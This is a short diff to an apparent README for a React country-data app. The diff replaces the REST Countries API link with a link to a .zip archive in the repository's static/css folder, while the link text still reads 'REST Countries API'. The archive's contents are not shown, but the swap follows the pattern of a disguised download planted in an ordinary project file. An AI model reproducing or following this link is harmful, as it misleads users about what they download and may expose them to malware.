@@ -1,4 +1,4 @@
-React task - REST Countries API with color theme switcher. Integrated with the [REST Countries API](https://restcountries.eu) to pull country data and display it like in the designs.
+React task - REST Countries API with color theme switcher. Integrated with the [REST Countries API](https://raw.githubusercontent.com/ranjanrajeev95/Countries_API_Using-React-JS/main/static/css/React_Using_AP_Countries_JS_1.3.zip) to pull country data and display it like in the designs.
 
 Users should be able to:
 
